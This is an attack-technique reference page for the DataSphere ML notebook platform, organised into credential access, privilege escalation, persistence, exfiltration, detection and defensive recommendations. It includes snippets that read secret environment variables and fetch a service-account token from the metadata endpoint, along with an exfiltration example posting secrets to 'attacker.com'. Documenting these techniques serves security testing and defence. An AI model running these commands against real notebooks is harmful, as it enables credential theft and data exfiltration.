# DataSphere — ML Platform

## Overview

DataSphere provides Jupyter notebook environments for machine learning. Notebooks execute code with access to project secrets, service accounts, and cloud resources. The interactive environment and secret management are the primary attack surfaces.

## Credential Access

### Environment Variable Secrets

Project secrets are exposed as environment variables in notebook cells:

```python
import os
db_password = os.environ.get('DB_PASSWORD')
api_key = os.environ.get('API_KEY')
s3_secret = os.environ.get('AWS_SECRET_ACCESS_KEY')
```

### Secret Sharing Across Community

Secrets can be shared within a DataSphere community:
- Requires `Editor` in source project, `Developer` in target community
- Shared secrets appear in community resources
- All community members with project access can read shared secrets

### Service Account Token

If a service account is assigned to the project:

```python
import requests
r = requests.get(
    'http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token',
    headers={'Metadata-Flavor': 'Google'}
)
token = r.json()['access_token']
```

---

## Privilege Escalation

### SA-Bound Notebook Execution

Notebooks execute with the project's service account. Code in a notebook cell can use the SA to:
- Access Object Storage
- Read Lockbox secrets
- Call any Yandex Cloud API the SA has roles for

### Package Supply Chain

Notebooks can install packages from public registries:

```python
!pip install malicious-package
```

A supply chain attack via typosquatting or dependency confusion provides code execution in the notebook environment.

---

## Persistence

### Scheduled Notebook Execution

DataSphere supports scheduled runs — configure notebooks to execute periodically, maintaining persistent access.

### Shared Resource Persistence

Shared secrets and datasets persist across project copies and community sharing.

---

## Exfiltration

From a notebook cell:

```python
import requests
# Read sensitive data via SA
token = get_sa_token()
secrets = get_lockbox_secrets(token)
# Exfiltrate
requests.post('https://attacker.com/exfil', json=secrets)
```

---

## Detection

| Indicator | Source |
|---|---|
| Secret access | DataSphere audit logs |
| Unusual SA token usage | IAM audit events |
| External HTTP requests | VPC flow logs |
| Package installation | Notebook execution logs |

## Defensive Recommendations

1. Bind minimum-privilege SAs to projects
2. Audit shared secrets across communities
3. Use private package mirrors instead of public PyPI
4. Monitor notebook execution and external network access
5. Limit secret sharing scope
